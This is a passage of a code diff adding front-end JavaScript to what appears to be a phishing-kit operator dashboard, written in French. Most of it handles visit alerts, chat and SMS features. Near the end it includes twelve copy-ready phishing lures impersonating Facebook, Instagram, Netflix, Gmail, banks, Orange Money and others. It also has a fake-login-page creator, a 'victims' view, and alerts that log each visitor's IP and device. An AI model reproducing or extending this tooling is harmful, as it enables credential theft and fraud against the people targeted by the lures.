+        const buffer = new ArrayBuffer(44 + numSamples * 2);
+        const view = new DataView(buffer);
+
+        function writeStr(offset, str) {
+            for (let i = 0; i < str.length; i++) view.setUint8(offset + i, str.charCodeAt(i));
+        }
+
+        writeStr(0, "RIFF");
+        view.setUint32(4, 36 + numSamples * 2, true);
+        writeStr(8, "WAVE");
+        writeStr(12, "fmt ");
+        view.setUint32(16, 16, true);
+        view.setUint16(20, 1, true);
+        view.setUint16(22, 1, true);
+        view.setUint32(24, sampleRate, true);
+        view.setUint32(28, sampleRate * 2, true);
+        view.setUint16(32, 2, true);
+        view.setUint16(34, 16, true);
+        writeStr(36, "data");
+        view.setUint32(40, numSamples * 2, true);
+
+        for (let i = 0; i < numSamples; i++) {
+            const t = i / sampleRate;
+            const pulse = (Math.floor(t * 8) % 2 === 0) ? 1560 : 2120;
+            const envelope = Math.min(1, t * 25) * Math.max(0, 1 - (t / durationSec) * 0.25);
+            const sample = Math.sin(2 * Math.PI * pulse * t) * 0.95 * envelope;
+            view.setInt16(44 + i * 2, sample * 32767, true);
+        }
+
+        let binary = "";
+        const bytes = new Uint8Array(buffer);
+        for (let i = 0; i < bytes.byteLength; i++) {
+            binary += String.fromCharCode(bytes[i]);
+        }
+        return "data:audio/wav;base64," + btoa(binary);
+    }
+
+    const FALLBACK_WAV_URL = createFallbackAlertWavDataUrl();
+
+    function getSharedAudioElement(src) {
+        if (!sharedAudioEl) {
+            sharedAudioEl = document.createElement("audio");
+            sharedAudioEl.setAttribute("playsinline", "");
+            sharedAudioEl.setAttribute("webkit-playsinline", "");
+            sharedAudioEl.preload = "auto";
+            sharedAudioEl.style.display = "none";
+            document.body.appendChild(sharedAudioEl);
+        }
+        if (src && sharedAudioEl.src !== src) {
+            sharedAudioEl.src = src;
+        }
+        sharedAudioEl.loop = false;
+        sharedAudioEl.volume = 1.0;
+        return sharedAudioEl;
+    }
+
+    function ensureAudioContext() {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (!AudioCtx) return null;
+        if (!sharedAudioCtx) {
+            sharedAudioCtx = new AudioCtx();
+        }
+        if (sharedAudioCtx.state === "suspended") {
+            sharedAudioCtx.resume().catch(() => {});
+        }
+        return sharedAudioCtx;
+    }
+
+    function clearSynthTimers() {
+        activeSynthTimers.forEach(t => clearTimeout(t));
+        activeSynthTimers = [];
+    }
+
+    function playSynthPattern(patternIndex = 0) {
+        try {
+            const ctx = ensureAudioContext();
+            if (!ctx) return false;
+            clearSynthTimers();
+
+            const scales = [
+                [1046.5, 1318.5, 1567.98, 1046.5, 1760.0, 1318.5],
+                [880.0, 1174.66, 1396.91, 1760.0, 1396.91, 1174.66],
+                [1174.66, 1479.98, 1760.0, 2093.0, 1760.0, 1479.98]
+            ];
+            const notes = scales[patternIndex % scales.length];
+
+            const playBurst = (offsetSec) => {
+                const now = ctx.currentTime + offsetSec;
+                notes.forEach((freq, idx) => {
+                    const osc = ctx.createOscillator();
+                    const gain = ctx.createGain();
+                    osc.type = idx % 2 === 0 ? "triangle" : "sine";
+                    osc.frequency.setValueAtTime(freq, now + idx * 0.16);
+                    gain.gain.setValueAtTime(0.001, now + idx * 0.16);
+                    gain.gain.exponentialRampToValueAtTime(0.45, now + idx * 0.16 + 0.02);
+                    gain.gain.exponentialRampToValueAtTime(0.0001, now + idx * 0.16 + 0.15);
+                    osc.connect(gain);
+                    gain.connect(ctx.destination);
+                    osc.start(now + idx * 0.16);
+                    osc.stop(now + idx * 0.16 + 0.16);
+                });
+            };
+
+            playBurst(0);
+            playBurst(1.05);
+            return true;
+        } catch (_) {
+            return false;
+        }
+    }
+
+    function markVisitAlerted(id) {
+        const numId = parseInt(id || "0", 10);
+        if (!numId) return;
+        alertedVisitIds.add(numId);
+        if (numId > lastSeenVisitId) {
+            lastSeenVisitId = numId;
+            localStorage.setItem('abeilles_last_visit_id', String(lastSeenVisitId));
+        }
+        try {
+            sessionStorage.setItem("abeilles_alerted_visits", JSON.stringify(Array.from(alertedVisitIds).slice(-100)));
+        } catch (_) {}
+    }
+
+    function buildLetterText(visitObj, methodLabel) {
+        return (
+            `📩 Visite détectée sur votre lien (6s max • ${methodLabel}) :\n` +
+            `• Propriétaire : ${visitObj.owner || "Kim"}\n` +
+            `• Plateforme : ${visitObj.network || "Plateforme"}\n` +
+            `• Chemin : ${visitObj.path_visited || ""}\n` +
+            `• Appareil & IP : ${visitObj.device || ""} (${visitObj.ip || ""})\n` +
+            `• Heure : ${visitObj.created_at || ""}`
+        );
+    }
+
+    // Déverrouille silencieusement sans faire sonner lors d'un clic libre sur la page
+    function silentUnlockAudioOnly() {
+        try {
+            const ctx = ensureAudioContext();
+            if (ctx && ctx.state === "suspended") {
+                ctx.resume().catch(() => {});
+            }
+            const src = customAlertMp3DataUrl || FALLBACK_WAV_URL;
+            const el = getSharedAudioElement(src);
+            el.preload = "auto";
+        } catch (_) {}
+    }
+
+    ["pointerdown", "touchstart", "click", "keydown"].forEach((evName) => {
+        document.addEventListener(evName, (e) => {
+            if (e.target && e.target.closest && (
+                e.target.closest("#btn-test-alert-sound") ||
+                e.target.closest("#round-methods-container") ||
+                e.target.closest("#select-all-methods-btn") ||
+                e.target.closest("#alert-master-switch-btn")
+            )) {
+                return;
+            }
+            silentUnlockAudioOnly();
+        }, { passive: true });
+    });
+
+    async function executeSingleSubMethod(methodName, src, patternSeed) {
+        if (methodName === "html5_primary") {
+            const el = getSharedAudioElement(src);
+            el.muted = false;
+            el.currentTime = 0;
+            activeAlertMedia = el;
+            await el.play();
+            return true;
+        }
+        if (methodName === "html5_fresh") {
+            const fresh = new Audio(src);
+            fresh.volume = 1.0;
+            activeAlertMedia = fresh;
+            await fresh.play();
+            return true;
+        }
+        if (methodName === "html5_fallback_wav") {
+            const wavAudio = new Audio(FALLBACK_WAV_URL);
+            wavAudio.volume = 1.0;
+            activeAlertMedia = wavAudio;
+            await wavAudio.play();
+            return true;
+        }
+        if (methodName === "webaudio_chime") {
+            const ctx = ensureAudioContext();
+            if (!ctx) return false;
+            if (ctx.state === "suspended") await ctx.resume();
+            return playSynthPattern(patternSeed);
+        }
+        if (methodName === "webaudio_pulse") {
+            const ctx = ensureAudioContext();
+            if (!ctx) return false;
+            if (ctx.state === "suspended") await ctx.resume();
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            osc.type = "sawtooth";
+            osc.frequency.setValueAtTime(980, ctx.currentTime);
+            osc.frequency.exponentialRampToValueAtTime(1560, ctx.currentTime + 0.35);
+            gain.gain.setValueAtTime(0.25, ctx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.45);
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+            osc.start();
+            osc.stop(ctx.currentTime + 0.46);
+            return true;
+        }
+        return false;
+    }
+
+    // Parcourt les boutons sélectionnés (1 -> 10), 5 méthodes par bouton, s'arrête au premier succès
+    async function runChainAcrossSelectedButtons(sourceTag = "visit-alert", options = {}) {
+        const forceEvenIfSwitchOff = Boolean(options.forceEvenIfSwitchOff);
+        const showAlertTable = Boolean(options.showAlertTable);
+        const visitObj = options.visitObj || null;
+        const isReplayAfterReturn = Boolean(options.isReplayAfterReturn);
+
+        if (!alertSwitchEnabled && !forceEvenIfSwitchOff) {
+            return { succeeded: false, winningButton: 0, winningStep: 0 };
+        }
+
+        const queue = selectedAlertMethods.length > 0 ? [...selectedAlertMethods] : [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+        const src = customAlertMp3DataUrl || FALLBACK_WAV_URL;
+
+        for (const btnNum of queue) {
+            const steps = BUTTON_METHOD_SUITES[btnNum] || BUTTON_METHOD_SUITES[1];
+            for (let i = 0; i < steps.length; i++) {
+                try {
+                    const ok = await executeSingleSubMethod(steps[i], src, btnNum + i);
+                    if (ok) {
+                        highlightTriggeredMethod(btnNum);
+                        const label = `Bouton #${btnNum} • Méthode ${i + 1}/5`;
+                        if (showAlertTable) {
+                            showAlertModalNow(visitObj, label, isReplayAfterReturn);
+                        }
+                        if (sourceTag === "test-button") {
+                            showToast(`Test OK via ${label} • Tableau 6s max`);
+                        }
+                        return { succeeded: true, winningButton: btnNum, winningStep: i + 1 };
+                    }
+                } catch (_) {}
+            }
+        }
+
+        if (showAlertTable) {
+            showAlertModalNow(visitObj, "Secours visuel • 6s max", isReplayAfterReturn);
+        }
+        return { succeeded: false, winningButton: 0, winningStep: 0 };
+    }
+
+    document.addEventListener("visibilitychange", () => {
+        if (!document.hidden && alertSwitchEnabled) {
+            silentUnlockAudioOnly();
+            if (pendingMissedVisit) {
+                const missed = pendingMissedVisit;
+                pendingMissedVisit = null;
+                triggerSynchronizedAlert(missed, true);
+            } else {
+                pollLinkVisits();
+            }
+        }
+    });
+
+    window.addEventListener("focus", () => {
+        if (alertSwitchEnabled) {
+            silentUnlockAudioOnly();
+            pollLinkVisits();
+        }
+    });
+
+    function broadcastAlertToTabs(visitObj) {
+        if (!alertSwitchEnabled) return;
+        try {
+            if (alertBroadcastChannel) {
+                alertBroadcastChannel.postMessage({ type: "NEW_VISIT_ALERT", visit: visitObj });
+            }
+        } catch (_) {}
+        try {
+            localStorage.setItem("abeilles_cross_tab_alert", JSON.stringify({
+                ts: Date.now(),
+                visit: visitObj
+            }));
+        } catch (_) {}
+    }
+
+    if (alertBroadcastChannel) {
+        alertBroadcastChannel.onmessage = (ev) => {
+            if (!alertSwitchEnabled) return;
+            const d = ev.data || {};
+            if (d.type === "NEW_VISIT_ALERT" && d.visit) {
+                const vId = parseInt(d.visit.id || "0", 10);
+                if (!vId || !alertedVisitIds.has(vId)) {
+                    if (vId) markVisitAlerted(vId);
+                    triggerSynchronizedAlert(d.visit, false);
+                }
+            }
+        };
+    }
+
+    window.addEventListener("storage", (ev) => {
+        if (!alertSwitchEnabled) return;
+        if (ev.key === "abeilles_cross_tab_alert" && ev.newValue) {
+            try {
+                const parsed = JSON.parse(ev.newValue);
+                if (parsed && parsed.visit) {
+                    const vId = parseInt(parsed.visit.id || "0", 10);
+                    if (!vId || !alertedVisitIds.has(vId)) {
+                        if (vId) markVisitAlerted(vId);
+                        triggerSynchronizedAlert(parsed.visit, false);
+                    }
+                }
+            } catch (_) {}
+        }
+    });
+
+    function triggerSynchronizedAlert(visitObj, isReplayAfterReturn = false) {
+        if (!alertSwitchEnabled) return;
+        runChainAcrossSelectedButtons("visit-alert", {
+            showAlertTable: true,
+            forceEvenIfSwitchOff: false,
+            visitObj: visitObj,
+            isReplayAfterReturn: isReplayAfterReturn
+        });
+    }
+
+    async function pollLinkVisits() {
+        if (!alertSwitchEnabled) return;
+        if (isPollingVisits) return;
+        isPollingVisits = true;
+        try {
+            if (!baselineInitialized) {
+                const initRes = await fetch(apiUrl("/api/link_visits?after_id=999999999"));
+                if (initRes.ok) {
+                    const initData = await initRes.json();
+                    const serverMax = parseInt(initData.latest_id || "0", 10);
+                    if (serverMax > lastSeenVisitId) {
+                        lastSeenVisitId = serverMax;
+                        localStorage.setItem('abeilles_last_visit_id', String(lastSeenVisitId));
+                    }
+                    baselineInitialized = true;
+                }
+                return;
+            }
+
+            const res = await fetch(apiUrl(`/api/link_visits?after_id=${lastSeenVisitId}`));
+            if (!res.ok) return;
+            const data = await res.json();
+            const list = data.visits || [];
+
+            for (const visit of list) {
+                const vId = parseInt(visit.id || "0", 10);
+                if (vId > lastSeenVisitId && !alertedVisitIds.has(vId)) {
+                    markVisitAlerted(vId);
+                    broadcastAlertToTabs(visit);
+                    if (document.hidden) {
+                        pendingMissedVisit = visit;
+                    }
+                    triggerSynchronizedAlert(visit, false);
+                    break;
+                }
+            }
+        } catch (_) {
+        } finally {
+            isPollingVisits = false;
+        }
+    }
+
+    function refreshCustomMp3StatusLabel() {
+        const el = document.getElementById("custom-mp3-status");
+        if (!el) return;
+        if (customAlertMp3DataUrl) {
+            el.textContent = "Actif : " + (customAlertMp3Name || "Fichier audio/vidéo choisi");
+            el.style.color = "#f5b014";
+        } else {
+            el.textContent = "Par défaut : Musique / Bip intégré";
+            el.style.color = "#4caf50";
+        }
+    }
+
+    function handleCustomAlertMp3(input) {
+        const file = input.files && input.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            customAlertMp3DataUrl = e.target.result || "";
+            customAlertMp3Name = file.name || "alerte.mp3";
+            try {
+                localStorage.setItem('abeilles_custom_mp3', customAlertMp3DataUrl);
+                localStorage.setItem('abeilles_custom_mp3_name', customAlertMp3Name);
+            } catch (_) {
+                showToast("Fichier audio chargé en mémoire de session.");
+            }
+            refreshCustomMp3StatusLabel();
+            silentUnlockAudioOnly();
+            showToast("Musique d'alerte enregistrée : " + customAlertMp3Name);
+        };
+        reader.readAsDataURL(file);
+    }
+
+    function clearCustomAlertMp3() {
+        customAlertMp3DataUrl = "";
+        customAlertMp3Name = "";
+        localStorage.removeItem('abeilles_custom_mp3');
+        localStorage.removeItem('abeilles_custom_mp3_name');
+        const inp = document.getElementById("custom-alert-mp3-file");
+        if (inp) inp.value = "";
+        refreshCustomMp3StatusLabel();
+        showToast("Musique d'alerte réinitialisée.");
+    }
+
+    function getPlatformDefaultLogo(networkName) {
+        const net = (networkName || "").trim().toLowerCase();
+        const found = platformsList.find(p => p.name.toLowerCase() === net || net.includes(p.name.toLowerCase()));
+        return found ? found.img : DEFAULT_AVATAR;
+    }
+
+    function previewSignupAvatar(input) {
+        const file = input.files && input.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            const img = new Image();
+            img.onload = () => {
+                const canvas = document.createElement("canvas");
+                canvas.width = 120;
+                canvas.height = 120;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(img, 0, 0, 120, 120);
+                pendingSignupAvatar = canvas.toDataURL("image/jpeg", 0.78);
+                document.getElementById("reg-avatar-preview").src = pendingSignupAvatar;
+            };
+            img.src = e.target.result;
+        };
+        reader.readAsDataURL(file);
+    }
+
+    function getOrderedConnectedList() {
+        const list = [];
+        if (currentSessionUser && currentSessionUser.username) {
+            list.push({
+                username: currentSessionUser.username,
+                avatar_url: currentSessionUser.avatar_url || DEFAULT_AVATAR,
+                isSelf: true
+            });
+        }
+        registeredUsers.forEach(u => {
+            if (!u.username) return;
+            if (currentSessionUser && u.username.toLowerCase() === currentSessionUser.username.toLowerCase()) return;
+            list.push({
+                username: u.username,
+                avatar_url: u.avatar_url || DEFAULT_AVATAR,
+                isSelf: false
+            });
+        });
+        PERMANENT_AVATARS.forEach(pa => {
+            if (!list.some(item => item.username.toLowerCase() === pa.username.toLowerCase())) {
+                list.push({
+                    username: pa.username,
+                    avatar_url: pa.avatar_url,
+                    isSelf: false
+                });
+            }
+        });
+        return list;
+    }
+
+    function renderPresenceStack() {
+        const container = document.getElementById("presence-avatars-list");
+        if (!container) return;
+        const fullList = getOrderedConnectedList();
+        const visibleList = fullList.slice(0, 20);
+        container.innerHTML = visibleList.map((m, idx) => {
+            const titleTxt = m.isSelf ? `${m.username} (Vous)` : m.username;
+            const delay = (idx * 0.14).toFixed(2);
+            return `<img class="presence-avatar-item" src="${m.avatar_url || DEFAULT_AVATAR}" alt="${titleTxt}" title="${titleTxt}" style="animation-delay:${delay}s;">`;
+        }).join("");
+    }
+
+    function openOnlineMembersModal() {
+        const fullList = getOrderedConnectedList();
+        document.getElementById("online-members-count").textContent = fullList.length;
+        const box = document.getElementById("online-members-list");
+        box.innerHTML = fullList.map(m => {
+            const canChat = currentSessionUser && !m.isSelf;
+            const badge = m.isSelf ? `<span style="color:#4caf50; font-size:11px; font-weight:bold;">Connecté (Vous)</span>` :
+                (canChat ? `<button type="button" class="link-btn link-blue" onclick="openDirectChat('${m.username.replace(/'/g, "\\'")}')">Écrire</button>` :
+                 `<span style="color:#888; font-size:11px;">En ligne</span>`);
+            return `
+                <div class="online-member-row">
+                    <div class="online-member-left">
+                        <img src="${m.avatar_url || DEFAULT_AVATAR}" alt="${m.username}">
+                        <span style="font-weight:bold; font-size:12.5px; color:#fff;">${m.username}</span>
+                    </div>
+                    ${badge}
+                </div>
+            `;
+        }).join("");
+        document.getElementById("online-members-modal").classList.remove("hidden");
+    }
+
+    function openDirectChat(peerName) {
+        if (!currentSessionUser) {
+            showToast("Connectez-vous d'abord pour envoyer un message.");
+            return;
+        }
+        activeDirectPeer = peerName;
+        document.getElementById("online-members-modal").classList.add("hidden");
+        document.getElementById("direct-chat-title").textContent = `Discussion avec ${peerName}`;
+        document.getElementById("direct-attach-bar").classList.add("hidden");
+        document.getElementById("direct-chat-modal").classList.remove("hidden");
+        loadDirectMessages();
+    }
+
+    function closeDirectChatModal() {
+        stopVoiceIfRecording();
+        document.getElementById("direct-chat-modal").classList.add("hidden");
+    }
+
+    function toggleDirectAttachMenu() {
+        document.getElementById("direct-attach-bar").classList.toggle("hidden");
+    }
+
+    async function deleteMessageById(msgId, refreshMode) {
+        if (!msgId) return;
+        try {
+            const res = await fetch(apiUrl(`/api/messages/${msgId}`), { method: "DELETE" });
+            const data = await res.json();
+            if (data.status === "success") {
+                showToast("Message supprimé.");
+                if (refreshMode === "direct") {
+                    await loadDirectMessages();
+                } else {
+                    await loadSmsMessages();
+                }
+            }
+        } catch (_) {
+            showToast("Erreur lors de la suppression.");
+        }
+    }
+
+    function renderBubbleHtml(m, selfName, refreshMode) {
+        const isMine = selfName && (m.sender || "").toLowerCase() === selfName.toLowerCase();
+        let bodyHtml = "";
+        if (m.msg_type === "voice" && m.media_data) {
+            bodyHtml = `<audio controls src="${m.media_data}" style="max-width:210px; height:32px;"></audio>`;
+        } else if (m.msg_type === "photo" && m.media_data) {
+            bodyHtml = `<img src="${m.media_data}" alt="Photo" style="max-width:200px; border-radius:4px; display:block;">`;
+        } else {
+            bodyHtml = `<div>${m.content || ""}</div>`;
+        }
+        const delBtn = `<button type="button" class="delete-msg-icon-btn" title="Supprimer" onclick="deleteMessageById(${m.id}, '${refreshMode}')">🗑️</button>`;
+
+        return `
+            <div class="chat-bubble-row ${isMine ? "mine" : "theirs"}">
+                ${isMine ? delBtn : ""}
+                <div class="chat-bubble ${isMine ? "mine" : "theirs"}">
+                    <div class="chat-meta"><strong>${m.sender}</strong> → ${m.recipient} • ${m.created_at || ""}</div>
+                    ${bodyHtml}
+                </div>
+                ${!isMine ? delBtn : ""}
+            </div>
+        `;
+    }
+
+    async function loadDirectMessages() {
+        if (!currentSessionUser || !activeDirectPeer) return;
+        try {
+            const res = await fetch(apiUrl(`/api/messages?user=${encodeURIComponent(currentSessionUser.username)}&peer=${encodeURIComponent(activeDirectPeer)}`));
+            const data = await res.json();
+            const box = document.getElementById("direct-chat-history");
+            const msgs = data.messages || [];
+            box.innerHTML = msgs.length
+                ? msgs.map(m => renderBubbleHtml(m, currentSessionUser.username, "direct")).join("")
+                : `<div style="color:#888; font-size:12px; text-align:center; margin-top:40px;">Aucun message. Dites "Salut" !</div>`;
+            box.scrollTop = box.scrollHeight;
+        } catch (_) {}
+    }
+
+    async function postMessagePayload(payload) {
+        const res = await fetch(apiUrl("/api/messages/send"), {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        if (res.status === 429 || data.status === "locked") {
+            smsStatus.smsLocked = true;
+            smsStatus.smsUsedToday = data.smsUsedToday || smsStatus.smsLimit;
+            refreshSmsQuotaUI();
+            showToast(data.message || "Limite quotidienne SMS atteinte.");
+            return null;
+        }
+        if (data.smsUsedToday !== undefined) {
+            smsStatus.smsUsedToday = data.smsUsedToday;
+            smsStatus.smsLimit = data.smsLimit || 10;
+            smsStatus.smsLocked = Boolean(data.smsLocked);
+            refreshSmsQuotaUI();
+        }
+        return data;
+    }
+
+    async function sendDirectTextMessage() {
+        if (!currentSessionUser || !activeDirectPeer) return;
+        const inp = document.getElementById("direct-chat-input");
+        const txt = inp.value.trim();
+        if (!txt) return;
+        inp.value = "";
+        const res = await postMessagePayload({
+            sender: currentSessionUser.username,
+            recipient: activeDirectPeer,
+            channel: "direct",
+            msgType: "text",
+            content: txt
+        });
+        if (res && res.status === "success") {
+            loadDirectMessages();
+        }
+    }
+
+    function sendDirectPhotoFile(input) {
+        if (!currentSessionUser || !activeDirectPeer) return;
+        const file = input.files && input.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = async (e) => {
+            const img = new Image();
+            img.onload = async () => {
+                const canvas = document.createElement("canvas");
+                canvas.width = 480;
+                canvas.height = Math.round((img.height / img.width) * 480) || 360;
+                canvas.getContext("2d").drawImage(img, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL("image/jpeg", 0.75);
+                const res = await postMessagePayload({
+                    sender: currentSessionUser.username,
+                    recipient: activeDirectPeer,
+                    channel: "direct",
+                    msgType: "photo",
+                    content: "Photo envoyée",
+                    mediaData: dataUrl
+                });
+                if (res && res.status === "success") {
+                    loadDirectMessages();
+                }
+            };
+            img.src = e.target.result;
+        };
+        reader.readAsDataURL(file);
+        input.value = "";
+    }
+
+    function refreshSmsQuotaUI() {
+        const used = smsStatus.smsUsedToday || 0;
+        const lim = smsStatus.smsLimit || 10;
+        const locked = Boolean(smsStatus.smsLocked || used >= lim);
+
+        const navBadge = document.getElementById("sms-nav-badge");
+        if (navBadge) {
+            navBadge.textContent = `${used}/${lim}`;
+            navBadge.classList.toggle("locked", locked);
+        }
+        const qLbl = document.getElementById("sms-quota-label");
+        if (qLbl) qLbl.textContent = `${used}/${lim}`;
+
+        const banner = document.getElementById("sms-lock-banner");
+        const sendBtn = document.getElementById("sms-send-btn");
+        const voiceBtn = document.getElementById("sms-voice-btn");
+        const txtInp = document.getElementById("sms-text-input");
+
+        if (banner) banner.classList.toggle("hidden", !locked);
+        if (sendBtn) sendBtn.disabled = locked;
+        if (voiceBtn) voiceBtn.disabled = locked;
+        if (txtInp) txtInp.disabled = locked;
+    }
+
+    async function openSmsModal() {
+        if (!currentSessionUser) {
+            showToast("Connectez-vous pour accéder au canal SMS.");
+            return;
+        }
+        document.getElementById("sms-modal").classList.remove("hidden");
+        await loadSmsMessages();
+    }
+
+    async function loadSmsMessages() {
+        if (!currentSessionUser) return;
+        try {
+            const res = await fetch(apiUrl(`/api/messages?user=${encodeURIComponent(currentSessionUser.username)}`));
+            const data = await res.json();
+            smsStatus = {
+                smsUsedToday: data.smsUsedToday || 0,
+                smsLimit: data.smsLimit || 10,
+                smsLocked: Boolean(data.smsLocked)
+            };
+            refreshSmsQuotaUI();
+
+            const box = document.getElementById("sms-history");
+            const msgs = data.messages || [];
+            box.innerHTML = msgs.length
+                ? msgs.map(m => renderBubbleHtml(m, currentSessionUser.username, "sms")).join("")
+                : `<div style="color:#888; font-size:12px; text-align:center; margin-top:40px;">Aucun SMS envoyé aujourd'hui.</div>`;
+            box.scrollTop = box.scrollHeight;
+        } catch (_) {}
+    }
+
+    async function sendSmsMessage(msgType, mediaData = "") {
+        if (!currentSessionUser) return;
+        if (smsStatus.smsLocked || smsStatus.smsUsedToday >= smsStatus.smsLimit) {
+            refreshSmsQuotaUI();
+            showToast("Limite de 10 SMS/jour atteinte — Verrouillé.");
+            return;
+        }
+        const inp = document.getElementById("sms-text-input");
+        const txt = msgType === "voice" ? "Message vocal SMS" : (inp ? inp.value.trim() : "");
+        if (msgType === "text" && !txt) return;
+        if (msgType === "text" && inp) inp.value = "";
+
+        const res = await postMessagePayload({
+            sender: currentSessionUser.username,
+            recipient: "Groupe SMS",
+            channel: "sms",
+            msgType: msgType,
+            content: txt,
+            mediaData: mediaData
+        });
+        if (res && res.status === "success") {
+            await loadSmsMessages();
+        }
+    }
+
+    function stopVoiceIfRecording() {
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+        }
+    }
+
+    async function toggleVoiceRecording(channel) {
+        if (!currentSessionUser) return;
+        if (channel === "sms" && (smsStatus.smsLocked || smsStatus.smsUsedToday >= smsStatus.smsLimit)) {
+            showToast("Envoi SMS verrouillé (10/10 aujourd'hui).");
+            return;
+        }
+        const btn = channel === "sms" ? document.getElementById("sms-voice-btn") : document.getElementById("direct-voice-btn");
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+            if (btn) btn.textContent = "🎙️ Vocal";
+            return;
+        }
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            showToast("Microphone non disponible sur ce navigateur.");
+            return;
+        }
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            recordedChunks = [];
+            recordingTargetChannel = channel;
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data && e.data.size > 0) recordedChunks.push(e.data);
+            };
+            mediaRecorder.onstop = () => {
+                stream.getTracks().forEach(t => t.stop());
+                if (btn) btn.textContent = "🎙️ Vocal";
+                const blob = new Blob(recordedChunks, { type: "audio/webm" });
+                const reader = new FileReader();
+                reader.onloadend = async () => {
+                    const dataUrl = reader.result;
+                    if (recordingTargetChannel === "sms") {
+                        await sendSmsMessage("voice", dataUrl);
+                    } else if (recordingTargetChannel === "direct" && activeDirectPeer) {
+                        const res = await postMessagePayload({
+                            sender: currentSessionUser.username,
+                            recipient: activeDirectPeer,
+                            channel: "direct",
+                            msgType: "voice",
+                            content: "Message vocal",
+                            mediaData: dataUrl
+                        });
+                        if (res && res.status === "success") loadDirectMessages();
+                    }
+                };
+                reader.readAsDataURL(blob);
+            };
+            mediaRecorder.start();
+            if (btn) btn.textContent = "⏹ Stop";
+            showToast("Enregistrement vocal en cours...");
+        } catch (_) {
+            showToast("Accès au microphone refusé.");
+        }
+    }
+
+    function copyTextareaContent(textareaId) {
+        const el = document.getElementById(textareaId);
+        if (!el) return;
+        navigator.clipboard.writeText(el.value || "").then(() => {
+            showToast("Code HTML copié !");
+        }).catch(() => {
+            el.select();
+            document.execCommand("copy");
+            showToast("Code HTML copié !");
+        });
+    }
+
+    function clearTextareaContent(textareaId) {
+        const el = document.getElementById(textareaId);
+        if (!el) return;
+        el.value = "";
+        showToast("Contenu supprimé !");
+    }
+
+    function toggleBgInput() {
+        const type = document.getElementById('c-bgtype').value;
+        if(type === 'color') {
+            document.getElementById('row-bgcolor').classList.remove('hidden');
+            document.getElementById('row-bgimg').classList.add('hidden');
+        } else {
+            document.getElementById('row-bgcolor').classList.add('hidden');
+            document.getElementById('row-bgimg').classList.remove('hidden');
+        }
+    }
+
+    function toggleCreatorMode() {
+        const mode = document.getElementById('creator-mode').value;
+        document.getElementById('create-login-form-opt1').classList.add('hidden');
+        document.getElementById('create-login-form-opt2').classList.add('hidden');
+        document.getElementById('create-login-form-opt3').classList.add('hidden');
+
+        if(mode === 'option1') {
+            document.getElementById('create-login-form-opt1').classList.remove('hidden');
+        } else if(mode === 'option2') {
+            document.getElementById('create-login-form-opt2').classList.remove('hidden');
+        } else if(mode === 'option3') {
+            document.getElementById('create-login-form-opt3').classList.remove('hidden');
+        }
+    }
+
+    const privateMessages = [
+        { title: "1. Vérification Facebook", text: "Bonjour, votre compte Facebook nécessite une vérification immédiate suite à une activité suspecte : https://votre-lien.com" },
+        { title: "2. Sécurité Instagram", text: "Alerte de connexion : un nouvel appareil a tenté d'accéder à votre profil Instagram. Confirmez ici : https://votre-lien.com" },
+        { title: "3. Abonnement Netflix", text: "Votre abonnement Netflix a expiré. Mettez à jour vos coordonnées bancaires pour éviter la coupure : https://votre-lien.com" },
+        { title: "4. Code de Validation Gmail", text: "Sécurité Google : Entrez votre code d'accès temporaire pour valider votre session professionnelle : https://votre-lien.com" },
+        { title: "5. Prime Cadeau Amazon", text: "Félicitations ! Vous avez gagné un bon d'achat Amazon. Récupérez votre lot dès maintenant : https://votre-lien.com" },
+        { title: "6. Sécurité Telegram", text: "Mise à jour requise de votre application Telegram pour conserver vos discussions chiffrées : https://votre-lien.com" },
+        { title: "7. Bonus PUBG Mobile", text: "Recevez 5000 UC gratuits sur PUBG Mobile en vous connectant via votre identifiant officiel : https://votre-lien.com" },
+        { title: "8. Alerte Snapchat", text: "Quelqu'un a essayé de modifier le mot de passe de votre compte Snapchat. Vérifiez votre compte : https://votre-lien.com" },
+        { title: "9. Portail Abeilles du Niger", text: "Note d'information interne : Merci de valider votre présence sur le nouveau portail sécurisé : https://votre-lien.com" },
+        { title: "10. Mise à Jour Sécurité IT", text: "Intervention technique obligatoire sur votre messagerie d'entreprise. Authentifiez-vous ici : https://votre-lien.com" },
+        { title: "11. Alerte Banque Atlantique", text: "Votre compte bancaire a une retenue temporaire. Débloquez votre accès sécurisé en ligne : https://votre-lien.com" },
+        { title: "12. Validation Orange Money", text: "Confirmation de transfert en attente de validation sur votre portefeuille mobile. Cliquez ici : https://votre-lien.com" }
+    ];
+
+    function initMessagesGrid() {
+        const container = document.getElementById("messages-container");
+        container.innerHTML = "";
+        privateMessages.forEach((msg) => {
+            container.innerHTML += `
+                <div class="msg-card">
+                    <h4>${msg.title}</h4>
+                    <p>${msg.text}</p>
+                    <button class="link-btn link-blue" onclick="copyMessageText('${msg.text}')">Copier le message</button>
+                </div>
+            `;
+        });
+    }
+    initMessagesGrid();
+
+    refreshAlertSwitchUI();
+    refreshMethodButtonsUI();
+    refreshCustomMp3StatusLabel();
+    renderPresenceStack();
+    if (alertSwitchEnabled) {
+        pollLinkVisits();
+    }
+
+    if (currentSessionUser) {
+        loginSuccess(currentSessionUser.username, false);
+    }
+
+    function showSection(sectionId) {
+        ['view-home', 'view-signup', 'view-dashboard', 'view-victims', 'view-messages', 'view-create', 'view-password'].forEach(id => {
+            document.getElementById(id).classList.add('hidden');
+        });
+        document.getElementById('view-' + sectionId).classList.remove('hidden');
+        if(sectionId === 'victims') {
+            fetchVictimsFromServer();
